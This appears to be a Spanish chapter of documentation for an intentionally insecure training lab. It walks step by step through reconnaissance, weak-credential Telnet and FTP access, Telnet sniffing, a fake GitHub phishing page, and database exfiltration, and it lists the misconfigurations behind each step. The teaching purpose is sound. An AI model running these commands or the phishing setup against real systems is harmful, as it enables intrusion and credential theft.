# 5. Escenarios de ataque

Este documento describe, en orden creciente de compromiso, los ataques que un actor malicioso puede ejecutar desde la máquina `external-kali` contra la infraestructura insegura del laboratorio.

Cada fase incluye:
- **Contexto** del servicio o técnica utilizada.
- **Comandos paso a paso** indicando desde qué máquina se ejecutan.
- **Salida esperada** y su interpretación.
- **Malas prácticas** que habilitan el ataque.

---

## 5.0 Preparación del atacante

Antes de iniciar los ataques, conviene verificar que la máquina atacante (`external-kali`) tiene conectividad con los segmentos DMZ e interno, y que las herramientas necesarias están instaladas.

**Ejecutar desde `external-kali`:**

```bash
# Verificar conectividad con el firewall (puerta de enlace)
ping -c 2 100.70.9.1

# Verificar conectividad con la DMZ
ping -c 2 192.168.57.10

# Verificar conectividad con la red interna (debería responder)
ping -c 2 192.168.58.10
```

**Salida esperada**: los tres pings responden. Si alguno falla, repasar la sección 6.4 de solución de problemas.

Comprobar que las herramientas de ataque están disponibles:

```bash
which nmap hydra tcpdump dsniff smbclient enum4linux mysql
```

Todas deberían devolver una ruta. En caso contrario, ejecutar de nuevo el provision de Kali:

```bash
# Desde el host donde corre Vagrant
vagrant provision external-kali
```

## 5.1 Fase de reconocimiento

El reconocimiento es la primera fase de cualquier ataque. Consiste en obtener información sobre la red objetivo sin ser detectado: hosts activos, puertos abiertos, servicios y versiones.

### 5.1.1 ¿Qué es nmap?

`nmap` (Network Mapper) es la herramienta estándar para exploración de redes y auditoría de seguridad. Permite:

- Descubrir hosts activos en un rango de IPs (`-sn`).
- Identificar puertos abiertos en un host (`-p`).
- Detectar servicios y sus versiones (`-sV`).
- Inferir el sistema operativo (`-O`).

En este laboratorio, `nmap` se usa para mapear la DMZ y la red interna sin que el firewall lo impida ni lo registre.

### 5.1.2 Escaneo de servicios en la DMZ y red interna

Ejecutar desde `external-kali`:

```bash
# Escaneo rápido de la DMZ
nmap 192.168.57.10

# Escaneo completo de la red interna (versiones, SO, todos los puertos)
nmap -sV -sC -O -p- -T4 192.168.58.10
```

**¿Por qué funciona este escaneo?**

- El firewall tiene políticas `ACCEPT` para tráfico entre todos los segmentos (4.1.1).
- `ServerTokens Full` en Apache expone la versión exacta del servidor web (4.2.1).
- No hay IDS/IPS que alerte sobre el escaneo (4.1.3).

**Problema común**: si `nmap` no muestra el puerto 3306 (MySQL) en el servidor interno, revisar que MySQL está corriendo y escuchando en `0.0.0.0` (entrar en `internal-server` y ejecutar `sudo systemctl status mysql`). Si solo escucha en `127.0.0.1`, reejecutar el provision de `internal-server`.

### 5.1.3 ¿Qué es Samba y por qué enumerarlo?

`Samba` es una implementación libre del protocolo SMB/CIFS que permite compartir archivos e impresoras entre sistemas Unix y Windows. En entornos corporativos, Samba se usa para crear recursos compartidos de red.

En este laboratorio, Samba está configurado con acceso de invitado y permisos de escritura (4.3.4). Enumerarlo permite descubrir los recursos compartidos antes de intentar acceder a ellos.

`enum4linux` es una herramienta específica para enumerar recursos SMB: lista usuarios, grupos, recursos compartidos y políticas de contraseñas.

Ejecutar desde `external-kali`:

```bash
enum4linux 192.168.58.10
```

**Salidas más relevantes:**

- `Got domain/workgroup name: WORKGROUP` → detecta el grupo de trabajo.
- `Server 192.168.58.10 allows sessions using username '', password ''` → confirma acceso sin credenciales.
- `Share Enumeration` → lista `confidential` como recurso accesible.
- `//192.168.58.10/confidential Mapping: OK Listing: OK` → el recurso está mapeado y listable.
- Los mensajes de error (`Can't determine if host is part of domain`, `Can't get OS info with smbclient`, `No compatible protocol selected`) son ruido habitual de enum4linux contra Samba en Ubuntu

**¿Por qué funciona?**

- Samba tiene el recurso `confidential` configurado con `browsable=yes` y `guest ok=yes` (4.3.4).
- El firewall permite tráfico desde la red externa a la interna (4.1.1).

### 5.1.4 ¿Qué es Telnet y cómo se usa en este reconocimiento?

`Telnet` es un protocolo de red que permite acceder remotamente a una máquina mediante una interfaz de línea de comandos. Transmite todo en texto plano, incluyendo credenciales. Aunque hoy está obsoleto y reemplazado por SSH, aún se encuentra en sistemas heredados o mal configurados.

En este laboratorio, Telnet se usa en dos momentos:

1. Para acceder interactivamente al `dmz-server` con credenciales débiles.
2. Para capturar credenciales mediante escuchas de red (`tcpdump` o ARP spoofing).

En esta fase de reconocimiento, Telnet permite obtener un punto de apoyo en la DMZ y ejecutar escaneos ARP desde dentro.

Ejecutar desde `external-kali`:

```bash
# Acceso interactivo por Telnet al dmz-server
telnet 192.168.57.10
```

**Salida esperada:**

```text
Trying 192.168.57.10...
Connected to 192.168.57.10.
Escape character is '^]'.

Linux 5.15.0-179-generic (dmz-server) (pts/0)

dmz-server login: ftpoperator
Password: ftpoperator  (no se ve al escribir)

Welcome to Ubuntu 22.04.5 LTS ...
ftpoperator@dmz-server:~$
```

**!** Nota importante: como se observa en las pruebas reales, el usuario `ftpoperator` no tiene privilegios de sudo ni herramientas de escaneo avanzadas instaladas en la DMZ. Esto refleja un escenario realista donde el atacante, tras obtener acceso a un servidor, debe trabajar con las herramientas disponibles o instalar las suyas propias (pivoting con túneles, descarga de binarios, etc).

Para completar el reconocimiento desde la DMZ, se puede intentar un escaneo ARP básico con comandos disponibles:

```bash
# Desde la sesión Telnet en dmz-server
ip neigh show
ping -c 2 192.168.58.10
arp -a
```

**¿Por qué funciona el acceso Telnet?**

- Telnet está activo en el puerto 23 del `dmz-server` (4.2.6).
- Las credenciales viajan en texto plano y son triviales (`ftpoperator:ftpoperator`) (4.2.7).
- El firewall permite tráfico desde la red externa a la DMZ sin restricción (4.1.1).

## 5.2 Fase de acceso a la DMZ

Una vez identificados los servicios expuestos en la DMZ, el atacante procede a explotar cada uno de ellos para obtener información sensible, credenciales y un punto de apoyo interactivo en el servidor.

Todas las acciones de esta fase se ejecutan desde `external-kali`, salvo que se indique lo contrario.

---

### 5.2.1 Exfiltración de información vía HTTP

#### Contexto

HTTP (HyperText Transfer Protocol) es el protocolo que permite la comunicación entre navegadores web y servidores. En este laboratorio, el servidor Apache del `dmz-server` aloja un sitio web corporativo con múltiples vulnerabilidades de exposición de información.

El atacante no necesita explotar ninguna vulnerabilidad técnica: la información está publicada en directorios accesibles públicamente.

#### ¿Qué es Apache y por qué está en este laboratorio?

Apache es el servidor web más utilizado históricamente aunque hoy en día lidere Nginx. En entornos corporativos, aloja sitios web, portales internos y aplicaciones. En este laboratorio, Apache está mal configurado a propósito para exponer información que jamás debería ser pública.

#### Acceso al directorio `/backup/`

El directorio `/backup/` contiene archivos con credenciales y el mapa de red. Gracias al directory listing habilitado, cualquier visitante puede ver su contenido.

**Ejecutar desde `external-kali`:**

```bash
# Listar el contenido del directorio backup
curl http://192.168.57.10/backup/

# Descargar el archivo de credenciales
curl http://192.168.57.10/backup/credentials.txt

# Descargar el mapa de red
curl http://192.168.57.10/backup/network.txt
```

**Salida esperada para `credentials.txt`:**

```text
MySQL root: root/ (sin contraseña)
FTP operator: ftpoperator/ftpoperator
SSH interno: root/root
VPN admin: admin/admin123
```

**Salida esperada para `network.txt`:**

```text
Firewall: 100.70.9.1
DMZ: 192.168.57.10
Interno: 192.168.58.10
```

**Interpretación**: en un solo paso, el atacante obtiene las credenciales de cuatro servicios y las IPs de los tres segmentos de red. Esta información es suficiente para planificar el resto del ataque. Obviamente esto no sucedería así en un sitio real pero por simplificación de las pruebas se van a obtener de esta manera las credenciales.

#### Acceso a `phpinfo()`

El archivo `/info.php` contiene una llamada a la función `phpinfo()`, que muestra la configuración completa del intérprete PHP.

**Ejecutar desde `external-kali`:**

```bash
curl http://192.168.57.10/info.php
```

**Salida esperada (fragmento relevante):**

```text
<tr><td class="e">PHP Version </td><td class="v">8.1.2-1ubuntu2.24 </td></tr>
<tr><td class="e">System </td><td class="v">Linux dmz-server 5.15.0-179-generic #189-Ubuntu SMP Day Month 5 18:20:56 UTC 2026 x86_64 </td></tr>
<tr><td class="e">Server API </td><td class="v">Apache 2.0 Handler </td></tr>
<tr><td class="e">Loaded Configuration File </td><td class="v">/etc/php/8.1/apache2/php.ini </td></tr>
```

**Interpretación**: el atacante conoce la versión exacta de PHP, el sistema operativo, la API del servidor y la ubicación del archivo de configuración. Esta información permite buscar exploits específicos para PHP 8.1.2 o para la configuración concreta del servidor.

#### Acceso al panel de administración sin autenticación

El directorio `/admin/` contiene un panel PHP que consulta directamente la base de datos interna y muestra las credenciales en una tabla HTML.

**Ejecutar desde `external-kali`:**

```bash
curl http://192.168.57.10/admin/
```

**Interpretación**: **sin necesidad de autenticarse**, el atacante visualiza credenciales corporativas extraídas en tiempo real de la base de datos interna. Esto demuestra que el servidor DMZ tiene acceso **directo** a MySQL en la red interna.

#### Malas prácticas que habilitan este ataque

- Directory listing habilitado en Apache (`Options Indexes`).
- `phpinfo()` expuesto públicamente sin restricción de acceso.
- Panel de administración sin autenticación que consulta la base de datos interna.
- Archivos sensibles (`credentials.txt`, `network.txt`) en un directorio accesible vía web.
- `ServerTokens Full` que revela la versión exacta del servidor.

---

### 5.2.2 FTP anónimo y descarga de archivos sensibles

#### Contexto

FTP (File Transfer Protocol) es un protocolo para transferir archivos entre sistemas. A diferencia de SFTP o FTPS, el FTP tradicional no cifra las credenciales ni los datos transmitidos.

En este laboratorio, el servicio `vsftpd` permite acceso anónimo sin contraseña y ofrece permisos de lectura sobre archivos que contienen información crítica.

#### ¿Qué es `vsftpd`?

`vsftpd` (Very Secure FTP Daemon) es un servidor FTP para sistemas Unix. A pesar de su nombre, en este laboratorio se ha configurado de forma totalmente insegura, permitiendo acceso anónimo con permisos de escritura.

#### Acceso anónimo y descarga de archivos

**Ejecutar desde `external-kali`:**

```bash
# Conectar al servidor FTP como usuario anonymous
ftp 192.168.57.10
```

**Dentro de la sesión FTP:**

```text
Name: anonymous
Password: [vacío, pulsar Enter]

ftp> ls
ftp> cd public
ftp> ls
ftp> get readme.txt
ftp> get config_backup.txt
ftp> exit
```

**Salida esperada dentro de la sesión FTP:**

```text
230 Login successful.
ftp> ls
229 Entering Extended Passive Mode
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Jun 19 07:20 public
226 Directory send OK.
ftp> cd public
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0             286 Jun 19 07:20 readme.txt
-rwxr-xr-x    1 0        0             123 Jun 19 07:20 config_backup.txt
226 Directory send OK.
ftp> get config_backup.txt
local: config_backup.txt remote: config_backup.txt
150 Opening BINARY mode data connection for config_backup.txt (123 bytes)
226 Transfer complete.
123 bytes received in 00:00 (0.99 MiB/s)
```

**Ver el contenido descargado:**

```bash
cat config_backup.txt
```

**Salida esperada de `config_backup.txt`:**

```text
DB_HOST=192.168.58.10
DB_USER=root
DB_PASS=
DB_NAME=corporativedb
SMTP_USER=notificaciones@empresa.local
SMTP_PASS=smtp2024!
```

**Interpretación**: el atacante obtiene las credenciales completas de la base de datos MySQL interna (host, usuario, base de datos y el hecho de que no tiene contraseña), además de credenciales de correo electrónico corporativo. Con esta información, el acceso a la base de datos es inmediato.

#### Malas prácticas que habilitan este ataque

- FTP anónimo habilitado sin restricción de acceso.
- Permisos de lectura sobre archivos de configuración sensibles.
- Almacenamiento de credenciales en texto plano dentro de `config_backup.txt`.

---

### 5.2.3 Captura de credenciales Telnet en texto claro

#### Contexto

Telnet transmite toda la sesión, incluyendo nombres de usuario y contraseñas, en texto plano y sin cifrar. Cualquier dispositivo en la misma red que pueda interceptar el tráfico puede leer las credenciales directamente.

En este laboratorio, el atacante puede capturar sus propias credenciales de prueba o esperar a que un usuario legítimo inicie sesión en el servidor Telnet.

#### Captura pasiva con `tcpdump`

Se necesitan dos terminales en `external-kali`: una para generar el tráfico Telnet y otra para capturarlo.

**Terminal 1 (captura):**

```bash
sudo tcpdump -i eth1 -A -s0 port 23
```

**Terminal 2 (generación de tráfico):**

```bash
telnet 192.168.57.10
# Iniciar sesión con ftpoperator / ftpoperator
```

**Interpretación**: el nombre de usuario y la contraseña aparecen en texto claro, carácter por carácter, en la salida de `tcpdump`. Esto demuestra que cualquier tráfico Telnet puede ser interceptado y leído sin necesidad de herramientas avanzadas de descifrado.

#### Malas prácticas que habilitan este ataque

- Uso de Telnet en lugar de SSH para acceso remoto.
- Transmisión de credenciales sin cifrado.
- Ausencia de segmentación que impida a un atacante en la red externa capturar tráfico de la DMZ.

---

### 5.2.4 Phishing interno: captura de credenciales mediante página falsa

#### Contexto

El phishing es una técnica que consiste en suplantar la identidad de un servicio legítimo para engañar a las víctimas y obtener sus credenciales. En este laboratorio, el propio servidor DMZ aloja una página que imita el login de GitHub.

El atacante no necesita montar ninguna infraestructura externa: el phishing se sirve desde la propia DMZ comprometida, lo que aumenta la credibilidad ante las víctimas internas.

#### Acceso a la página de phishing

**Ejecutar desde `external-kali`:**

Lo recomendable para hacerlo más visual todo es hacerlo desde la interfaz gráfica del external-kali abriendo el navegador firefox y usar la URL http://192.168.57.10:8080 dentro de http://localhost:8082/vnc.html.

```bash
# Ver la página de phishing
curl http://192.168.57.10:8080
```

**Salida esperada**: HTML de una página igual al login de GitHub a 2026, con logo, formulario de usuario/contraseña, botones OAuth simulados (Google, GitHub Enterprise) y estilos CSS que replican el diseño oficial.

#### Envío simulado de credenciales

El atacante puede simular el envío de credenciales desde una supuesta víctima para verificar que la captura funciona:

```bash
curl -X POST http://192.168.57.10:8080/capture.php \
  -d "username=admin&password=Password123!"
```

#### Recolección de credenciales capturadas

Una vez que el atacante tiene acceso al `dmz-server` (por Telnet o SSH con las credenciales ya obtenidas), puede leer el archivo de log donde se almacenan las capturas:

**Ejecutar desde `dmz-server` (previa conexión por Telnet o SSH):**

```bash
cat /var/log/phishing.log
```

**Salida esperada:**

```text
[2026-06-19 08:20:15] IP=100.70.9.10 | user=admin | pass=Password123! | ua=curl/8.4.0
```

**Interpretación**: cada envío del formulario queda registrado con timestamp, IP de origen, usuario, contraseña y User-Agent. En un escenario real, este archivo contendría las credenciales de usuarios internos que hayan picado en el engaño.

#### Malas prácticas que habilitan este ataque

- Alojamiento de un sitio de phishing en el propio servidor corporativo.
- VirtualHost Apache que permite servir contenido malicioso en el puerto 8080.
- Escritura de credenciales en texto plano en un archivo de log sin protección.
- Acceso SSH con credencial débil que permite al atacante recolectar los logs.

## 5.4 Ataques de red: captura de tráfico Telnet

### Contexto

Telnet es un protocolo que transmite toda la sesión, incluyendo nombres de usuario y contraseñas, en texto plano y sin ningún tipo de cifrado. Cualquier dispositivo que pueda interceptar el tráfico de red entre el cliente y el servidor puede leer las credenciales directamente.

En este laboratorio, el atacante se encuentra en el mismo segmento de red que la DMZ gracias a la ausencia de filtrado del firewall. Esto le permite capturar el tráfico Telnet sin necesidad de técnicas activas como ARP spoofing.

### Captura pasiva con `tcpdump`

Se necesitan dos terminales en `external-kali`: una para generar el tráfico Telnet y otra para capturarlo.

**Terminal 1 — Captura del tráfico:**

```bash
# Ejecutar desde external-kali
sudo tcpdump -i eth1 -A -s0 port 23
```

**Terminal 2 — Generación de tráfico Telnet:**

```bash
# Ejecutar desde external-kali
telnet 192.168.57.10
```

Cuando aparezca el prompt de login, se introducen las credenciales:

```text
dmz-server login: ftpoperator
Password: ftpoperator
```

**Salida esperada en la Terminal 1 (fragmento relevante):**

```text
09:30:15.123456 IP external-kali.45678 > dmz-server.telnet: ...
Ubuntu 22.04.5 LTS
dmz-server login: f
t
p
o
p
e
r
a
t
o
r
Password: f
t
p
o
p
e
r
a
t
o
r
```

**Interpretación**: las credenciales aparecen en texto claro, carácter por carácter, en la salida de `tcpdump`. Esto demuestra que cualquier sesión Telnet puede ser interceptada y leída sin necesidad de herramientas avanzadas de descifrado. En un entorno real, un atacante que consiga situarse en la red podría capturar las credenciales de cualquier usuario que utilice Telnet.

#### Malas prácticas que habilitan este ataque

- Uso de Telnet en lugar de SSH para acceso remoto.
- Transmisión de credenciales sin cifrado.
- Ausencia de segmentación que impida a un atacante en la red externa ver el tráfico de la DMZ.
- Sin IDS/IPS que detecte actividad de captura de tráfico.

## 5.5 Exfiltración de datos

### Contexto

La exfiltración es la fase final del ataque: extraer información valiosa de la red comprometida hacia un punto controlado por el atacante. En este laboratorio, tras haber comprometido tanto la DMZ como la red interna, el atacante recolecta la base de datos corporativa y los archivos confidenciales de Samba, transfiriéndolos a la DMZ para su posterior descarga.

### ¿Por qué es posible la exfiltración?

En un entorno correctamente securizado, la exfiltración estaría bloqueada por:

- **Segmentación**: el servidor interno no tendría rutas hacia la DMZ.
- **Monitorización**: los logs del firewall registrarían transferencias anómalas.
- **DLP (Data Loss Prevention)**: sistemas que detectan y bloquean la salida de datos sensibles.

En este laboratorio, ninguna de estas medidas existe.

### Recolección de datos en el servidor interno

Una vez obtenido acceso como root al `internal-server`, el atacante prepara la información para su extracción.

**Ejecutar desde `internal-server` (previa conexión SSH como root):**

```bash
# Dump completo de la base de datos corporativa
mysqldump -u root corporativedb > /tmp/corporativedb.sql

# Comprimir el recurso Samba confidential
tar -czf /tmp/confidential.tar.gz /srv/samba/confidential/

# Verificar los archivos generados
ls -lh /tmp/corporativedb.sql /tmp/confidential.tar.gz
```

**Salida esperada:**

```text
-rw-r--r-- 1 root root 2,3K Jun 19 09:35 /tmp/corporativedb.sql
-rw-r--r-- 1 root root  456 Jun 19 09:35 /tmp/confidential.tar.gz
```

**Interpretación**: en pocos segundos, el atacante ha empaquetado toda la información sensible del servidor interno en dos archivos listos para transferir. El dump de MySQL contiene las tablas `user_credentials`, `network_inventory` y `employees`. El archivo `confidential.tar.gz` contiene el recurso Samba con el archivo `passwords.txt`.

### Transferencia de los datos a la DMZ

El atacante usa las credenciales ya conocidas para transferir los archivos al `dmz-server`.

**Ejecutar desde `internal-server` (como root):**

```bash
# Transferir el dump de MySQL a la DMZ
scp /tmp/corporativedb.sql ftpoperator@192.168.57.10:/tmp/

#contraseña: ftpoperator

# Transferir el archivo comprimido de Samba a la DMZ
scp /tmp/confidential.tar.gz ftpoperator@192.168.57.10:/tmp/
```

**Salida esperada:**

```text
corporativedb.sql                          100% XXXX     X.XKB/s   00:00
confidential.tar.gz                        100%  XXX     X.XKB/s   00:00
```

### Recuperación de los datos por el atacante

Una vez los archivos están en la DMZ, el atacante puede descargarlos desde `external-kali` usando SSH.

**Ejecutar desde `external-kali`:**

```bash
# Conectar al dmz-server con las credenciales ya conocidas
ssh ftpoperator@192.168.57.10

#contraseña: ftpoperator

# Dentro del dmz-server, verificar que los archivos están
ls -lh /tmp/*.sql /tmp/*.tar.gz
```

**Salida esperada:**

```text
-rw-r--r-- 1 ftpoperator ftpoperator XXXX Jun 19 09:36 /tmp/corporativedb.sql
-rw-r--r-- 1 ftpoperator ftpoperator  XXX Jun 19 09:36 /tmp/confidential.tar.gz
```

Para llevar los archivos a la máquina atacante, se puede usar `scp` de vuelta:

```bash
# Desde external-kali
scp ftpoperator@192.168.57.10:/tmp/corporativedb.sql .
scp ftpoperator@192.168.57.10:/tmp/confidential.tar.gz .
```

O simplemente leer los datos desde el propio `dmz-server`:

```bash
# Ver el contenido del dump de MySQL
cat /tmp/corporativedb.sql | head -50

# Extraer y ver passwords.txt desde el tar
tar -xzf /tmp/confidential.tar.gz -O
```

#### Interpretación final

El atacante ha conseguido:

- Una copia completa de la base de datos corporativa, incluyendo credenciales, datos personales de empleados e inventario de red.
- El recurso Samba con el archivo de contraseñas que da acceso a todos los servicios.

Todo ello sin que ningún sistema haya registrado la actividad, alertado al administrador o bloqueado la transferencia. En un caso real, esta información podría venderse, usarse para chantaje o emplearse para comprometer sistemas adicionales.

#### Malas prácticas que habilitan este ataque

- Ausencia total de monitorización y logging en el firewall.
- Ausencia de segmentación real: el servidor interno tiene rutas hacia la DMZ y puede iniciar conexiones.
- Sin control de exfiltración de datos (DLP).
- Credenciales reutilizadas que permiten mover archivos entre servidores.
- Almacenamiento de toda la información sensible en un único servidor sin cifrado en reposo.

<br>
<table style="width: 100%; border: none;">
  <tr>
    <td style="text-align: left; border: none; padding: 0;">
      <a href="04-malas-practicas.md">← Anterior</a>
    </td>
    <td style="text-align: center; border: none; padding: 0;">
      <a href="../README.md">Volver al índice</a>
    </td>
    <td style="text-align: right; border: none; padding: 0;">
      <a href="06-conclusiones.md">Siguiente →</a>
    </td>
  </tr>
</table>
